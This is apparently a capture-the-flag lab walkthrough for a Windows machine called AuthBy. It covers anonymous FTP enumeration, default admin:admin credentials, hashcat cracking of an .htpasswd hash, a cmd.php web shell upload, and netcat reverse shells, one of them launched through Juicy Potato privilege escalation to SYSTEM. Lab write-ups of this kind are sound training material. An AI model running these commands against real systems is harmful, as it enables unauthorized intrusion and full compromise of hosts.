# AuthBy

### Enumeration

```
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ...
|_dr-xr-xr-x   1 root     root          512 Sep 22 02:21 accounts
| ...
```

There is an information disclosure at accounts directory.

* acc\[Offsec].uac&#x20;
* acc\[anonymous].uac&#x20;
* acc\[admin].uac

```
$ ftp 192.168.234.46
admin:admin
```

There is a .htpasswd file.

```
$ cat .htpasswd 
offsec:$apr1$[REDACTED]

$ hashcat -m 1600 -w 4 -a 0 hash.txt ~/Desktop/rockyou.txt
offsec:[REDACTED]
```

### Initial Access

We need to put cmd.php command shell to admin's ftp directory. Because this directory is a web directory at 242/tcp port.

Web credential - offsec:\[REDACTED]

You can use smbserver.py to get reverse shell with nc.exe.

smbserver.py - [https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py)

nc.exe - [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe)

```
\\192.168.49.234\share\nc.exe -e cmd 192.168.49.234 80
```

### PrivEsc

SeImpersonatePrivilege - Enabled

http://ohpe.it/juicy-potato/\
http://ohpe.it/juicy-potato/CLSID

[https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe)

We need to put Juicy.Potato.x86.exe and nc.exe to admin's ftp directory.

```
C:> systeminfo
Windows Server 2008 R2 Enterprise
```

Windows Server 2008 R2 Enterprise CLSID

```
BITS {69AD4AEE-51BE-439b-A92C-86AE490E8B30} NT AUTHORITY\SYSTEM
```

```
C:\wamp\www> Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

[+] CreateProcessWithTokenW OK
```

```
C:\wamp\www> Juicy.Potato.x86.exe  -l 1337 -p nc.exe -a "-e cmd 192.168.49.234 80" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```
